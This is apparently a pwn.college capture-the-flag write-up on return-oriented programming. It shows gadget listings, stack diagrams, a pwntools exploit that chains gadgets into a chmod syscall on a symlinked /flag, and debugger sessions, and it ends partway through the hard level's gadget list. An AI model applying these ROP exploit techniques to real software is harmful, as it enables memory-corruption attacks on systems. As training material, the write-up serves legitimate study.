0x00000000004011e3 : cli ; ret
0x000000000040203b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004012f1 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401489 : cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x000000000040168a : dec ecx ; ret
0x0000000000401290 : endbr64 ; jmp 0x401220
0x00000000004011e0 : endbr64 ; ret
0x000000000040200c : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040163e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004011de : hlt ; nop ; endbr64 ; ret
0x00000000004016b9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x000000000040163b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004013dd : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401205 : je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401247 : je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401294 : jmp 0x401220
0x00000000004012f8 : jmp 0x401470
0x0000000000401578 : jmp 0x401608
0x0000000000401643 : jmp 0x40166f
0x0000000000401629 : jmp 0x401675
0x00000000004014cf : jmp 0x40168b
0x00000000004016c1 : jmp 0x4016e6
0x000000000040100b : jmp 0x4840104f
0x000000000040120c : jmp rax
0x000000000040148f : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040168b : leave ; ret
0x000000000040120d : loopne 0x401275 ; nop ; ret
0x0000000000401db7 : loopne 0x401dfa ; pop rax ; ret
0x0000000000401208 : mov byte ptr [rax + 0x40], dl ; add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401276 : mov byte ptr [rip + 0x3e2b], 1 ; pop rbp ; ret
0x0000000000401dd5 : mov dword ptr [rbp - 0x40], 0xc35a41 ; nop ; pop rbp ; ret
0x000000000040163c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x40166f
0x00000000004016ba : mov dword ptr [rbp - 4], 0 ; jmp 0x4016e6
0x0000000000401571 : mov dword ptr [rbp - 8], 0 ; jmp 0x401608
0x0000000000401fb1 : mov eax, 0 ; leave ; ret
0x0000000000401207 : mov edi, 0x405088 ; jmp rax
0x0000000000401570 : mov qword ptr [rbp - 8], 0 ; jmp 0x401608
0x00000000004011df : nop ; endbr64 ; ret
0x00000000004016f8 : nop ; leave ; ret
0x0000000000401d8a : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8b : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8c : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8d : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8e : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8f : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d90 : nop ; nop ; pop rbp ; ret
0x0000000000401d91 : nop ; pop rbp ; ret
0x000000000040120f : nop ; ret
0x000000000040128c : nop dword ptr [rax] ; endbr64 ; jmp 0x401220
0x0000000000401206 : or dword ptr [rdi + 0x405088], edi ; jmp rax
0x0000000000401dd8 : pop r10 ; ret
0x000000000040201c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401493 : pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040201e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401495 : pop r13 ; pop rbp ; ret
0x0000000000402020 : pop r14 ; pop r15 ; ret
0x0000000000402022 : pop r15 ; ret
0x0000000000401db8 : pop r8 ; ret
0x0000000000401da8 : pop r9 ; ret
0x0000000000401da0 : pop rax ; ret
0x0000000000401e7c : pop rax ; xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040201b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040201f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401496 : pop rbp ; pop rbp ; ret
0x000000000040127d : pop rbp ; ret
0x0000000000401492 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000401da9 : pop rcx ; ret
0x0000000000401dc8 : pop rdi ; ret
0x0000000000401dc0 : pop rdx ; ret
0x0000000000402021 : pop rsi ; pop r15 ; ret
0x0000000000401dd0 : pop rsi ; ret
0x000000000040201d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401494 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401209 : push rax ; add dil, dil ; loopne 0x401275 ; nop ; ret
0x000000000040101a : ret
0x00000000004014ff : ret 0x40be
0x0000000000401e8f : ret 0x458b
0x0000000000401e32 : ret 0x8948
0x0000000000401edf : ret 0x8b48
0x00000000004014af : ret 0x8be
0x0000000000401e85 : retf 0x148
0x0000000000401edc : rol byte ptr [rcx], 0x89 ; ret 0x8b48
0x0000000000401e82 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401484 : sbb byte ptr [rbx], 0 ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401485 : sbb eax, dword ptr [rax] ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401278 : sub edi, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040203d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040203c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401db0 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401203 : test eax, eax ; je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401245 : test eax, eax ; je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x0000000000401e2d : xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000401e7d : xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148

Unique gadgets found: 149
```

A `chmod` would work, but we need to find a string that we can use as discussed earlier.

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:/$ objdump -s -j .rodata /challenge/stop-pop-and-rop2-easy | grep -E "[0-9a-f]{2}00"
 403000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
 403050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
 403070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
 403090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
 4030e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
 403100 6c657220 6661696c 65642074 6f20696e  ler failed to in
 403110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
 403120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
 403140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
 403150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
 403160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
 403190 61742025 702e0a00 54686973 20636861  at %p...This cha
 403200 20746869 73207365 72696573 206f6600   this series of.
 403270 00000000 00000000 52656365 69766564  ........Received
 4032a0 64206761 64676574 732e0a00 00000000  d gadgets.......
 403300 67657473 20617265 20657865 63757461  gets are executa
 403310 626c6500 00000000 66726f6d 20776974  ble.....from wit
 403350 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
 403360 67210023 23230023 23232057 656c636f  g!.###.### Welco
 403370 6d652074 6f202573 210a0023 23232047  me to %s!..### G
 403380 6f6f6462 79652100                    oodbye!.   
```

Out of the various options that we have, let's go with `b"!\x00"` which is at the address `0x403386`.

- [x] Location of the buffer: `0x7ffd2b5e9be0` 
- [x] location of the stored return pointer to `main()`: `0x7ffd2b5e9c28`
- [x] Location of a NULL terminated string: `0x403386`

### ROP chain: ret2stack

This is the ROP chain that we will be performing.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd2b5e9be0 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd2b5e9c28 │  00 00 00 00 00 40 1d c8  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c30 │  00 00 00 00 00 40 33 86  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c30 │  00 00 00 00 00 40 33 86  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi ; pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386
rsi: 0o777

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r15 ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386
rsi: 0o777
r15: b"BBBBBBBB"

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386
rsi: 0o777
r15: b"BBBBBBBB"

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rax ; ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386
rsi: 0o777
r15: b"BBBBBBBB"
rax: 90

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c68 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403386
rsi: 0o777
r15: b"BBBBBBBB"
rax: 90

═══════════════════════════════════════════════════════════════════════════════════
rip --> syscall
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# Initialize values
pop_rax = 0x401da0
pop_rdi = 0x401dc8
pop_rsi_pop_r15 = 0x402021
syscall = 0x401db0
bang_addr = 0x403386

buffer_addr = 0x7ffc3c96a300
ret_addr = 0x7ffc3c96a348

# Calculate offset
offset = ret_addr - buffer_addr

p = process('/challenge/stop-pop-and-rop2-easy')

# Craft payload
payload = flat(
    b"A" * offset,

    # chmod("!", 0o777)
    pop_rdi, bang_addr,
    pop_rsi_pop_r15, 0o777, b"B" * 8,
    pop_rax, 90,
    syscall
)

# Send the payload
p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ python ~/script.py
[+] Starting local process '/challenge/stop-pop-and-rop2-easy': pid 1025
[*] Switching to interactive mode
[*] Process '/challenge/stop-pop-and-rop2-easy' stopped with exit code -11 (SIGSEGV) (pid 1025)
###
### Welcome to /challenge/stop-pop-and-rop2-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

Received 137 bytes! This is potentially 8 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 9 gadgets of ROP chain at 0x7ffeb1061138.
| 0x0000000000401dc8: pop rdi ; ret  ; 
| 0x0000000000403386: and dword ptr [rax], eax ; add dword ptr [rbx], ebx ; add edi, dword ptr [rbx] ; je 0x40338e ; add byte ptr [rax], al ; or eax, 0x98000000 ; fdiv st(7), st(0) ; 
| 0x0000000000402021: pop rsi ; pop r15 ; ret  ; 
| 0x00000000000001ff: (UNMAPPED MEMORY)
| 0x4242424242424242: (UNMAPPED MEMORY)
| 0x0000000000401da0: pop rax ; ret  ; 
| 0x000000000000005a: (UNMAPPED MEMORY)
| 0x0000000000401db0: syscall  ; ret  ; 
| 0x00007ffeb106120a: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov al, 0x11 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x12], dl ; 

Leaving!
[*] Got EOF while reading in interactive
$ 
```

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ cat /flag 
pwn.college{syRIf9w4Ac-DZiTHGLOc-VI3lcE.0VO0MDL4ITM0EzW}
```

&nbsp;

## Stop, Pop and ROP 2 (Hard)

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ /challenge/stop-pop-and-rop2-hard 
###
### Welcome to /challenge/stop-pop-and-rop2-hard!
###

```

We need the following to craft our exploit:
- [ ] Location of the buffer 
- [ ] location of the stored return pointer to `main()`
- [ ] Location of a NULL terminated string

Let's get the string addres first.

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:/$ objdump -s -j .rodata /challenge/stop-pop-and-rop2-hard | grep -E "[0-9a-f]{2}00"
 403000 01000200 4c656176 696e6721 00232323  ....Leaving!.###
 403030 2100                                 !.    
```

- [ ] Location of the buffer 
- [ ] location of the stored return pointer to `main()`
- [x] Location of a NULL terminated string: `0x403030`

### Binary Analysis

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x000000000040205e <+0>:     endbr64
   0x0000000000402062 <+4>:     push   rbp
   0x0000000000402063 <+5>:     mov    rbp,rsp
   0x0000000000402066 <+8>:     sub    rsp,0x60
   0x000000000040206a <+12>:    mov    DWORD PTR [rbp-0x44],edi
   0x000000000040206d <+15>:    mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000402071 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
   0x0000000000402075 <+23>:    lea    rax,[rbp-0x40]
   0x0000000000402079 <+27>:    mov    edx,0x1000
   0x000000000040207e <+32>:    mov    rsi,rax
   0x0000000000402081 <+35>:    mov    edi,0x0
   0x0000000000402086 <+40>:    call   0x4010b0 <read@plt>
   0x000000000040208b <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x000000000040208e <+48>:    lea    rdi,[rip+0xf6f]        # 0x403004
   0x0000000000402095 <+55>:    call   0x401090 <puts@plt>
   0x000000000040209a <+60>:    nop
   0x000000000040209b <+61>:    leave
   0x000000000040209c <+62>:    ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+40` and run.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x402086
```

```
pwndbg> run
Starting program: /challenge/stop-pop-and-rop2-hard 
###
### Welcome to /challenge/stop-pop-and-rop2-hard!
###


Breakpoint 1, 0x0000000000402086 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
 RBX  0x402160 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffdc51a0498 —▸ 0x7ffdc51a1661 ◂— '/challenge/stop-pop-and-rop2-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
 R8   0
 R9   0x32
 R10  0x4004e9 ◂— 0x66756276746573 /* 'setvbuf' */
 R11  0x79070332ace0 (setvbuf) ◂— endbr64 
 R12  0x4010d0 (_start) ◂— endbr64 
 R13  0x7ffdc51a0490 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffdc51a0370 —▸ 0x7ffdc51a03a0 ◂— 0
 RSP  0x7ffdc51a0310 ◂— 0
 RIP  0x402086 (challenge+40) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
 ► 0x402086 <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
        nbytes: 0x1000
 
   0x40208b <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x40208e <challenge+48>    lea    rdi, [rip + 0xf6f]           RDI => 0x403004 ◂— 'Leaving!'
   0x402095 <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x40209a <challenge+60>    nop    
   0x40209b <challenge+61>    leave  
   0x40209c <challenge+62>    ret    
 
   0x40209d <main>            endbr64 
   0x4020a1 <main+4>          push   rbp
   0x4020a2 <main+5>          mov    rbp, rsp
   0x4020a5 <main+8>          sub    rsp, 0x20
──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffdc51a0310 ◂— 0
01:0008│-058     0x7ffdc51a0318 —▸ 0x7ffdc51a04a8 —▸ 0x7ffdc51a1683 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-050     0x7ffdc51a0320 —▸ 0x7ffdc51a0498 —▸ 0x7ffdc51a1661 ◂— '/challenge/stop-pop-and-rop2-hard'
03:0018│-048     0x7ffdc51a0328 ◂— 0x100000000
04:0020│ rax rsi 0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
05:0028│-038     0x7ffdc51a0338 —▸ 0x79070333453d (_IO_file_setbuf+13) ◂— test rax, rax
06:0030│-030     0x7ffdc51a0340 —▸ 0x7907034936a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-028     0x7ffdc51a0348 —▸ 0x79070332ade5 (setvbuf+261) ◂— xor r8d, r8d
────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x402086 challenge+40
   1         0x402142 main+165
   2   0x7907032ca083 __libc_start_main+243
   3         0x4010fe _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of the buffer: `0x7ffdc51a0330`
- [ ] location of the stored return pointer to `main()`
- [x] Location of a NULL terminated string: `0x403030`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffdc51a0380:
 rip = 0x402086 in challenge; saved rip = 0x402142
 called by frame at 0x7ffdc51a03b0
 Arglist at 0x7ffdc51a0370, args: 
 Locals at 0x7ffdc51a0370, Previous frame's sp is 0x7ffdc51a0380
 Saved registers:
  rbp at 0x7ffdc51a0370, rip at 0x7ffdc51a0378
```

- [x] Location of the buffer: `0x7ffdc51a0330`
- [x] location of the stored return pointer to `main()`: `0x7ffdc51a0378`
- [x] Location of a NULL terminated string: `0x403030`

Finally let's take a look at the ROP gadgets.


```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:/$ ROPgadget --binary /challenge/stop-pop-and-rop2-hard 
Gadgets information
============================================================
0x00000000004010fd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040112b : add bh, bh ; loopne 0x401195 ; nop ; ret
0x000000000040203a : add byte ptr [rax - 0x39], cl ; fadd dword ptr [r9 + 0x5a] ; ret
0x0000000000402032 : add byte ptr [rax - 0x39], cl ; loopne 0x402092 ; ret
0x00000000004021cc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x000000000040214f : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000402150 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040119a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004021ce : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000402151 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040119b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401199 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010fb : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000402152 : add cl, cl ; ret
0x000000000040112a : add dil, dil ; loopne 0x401195 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040119c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401197 : add eax, 0x3ecb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000402099 : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x000000000040201e : clc ; pop r8 ; ret
0x00000000004011b3 : cli ; jmp 0x401140
0x0000000000401103 : cli ; ret
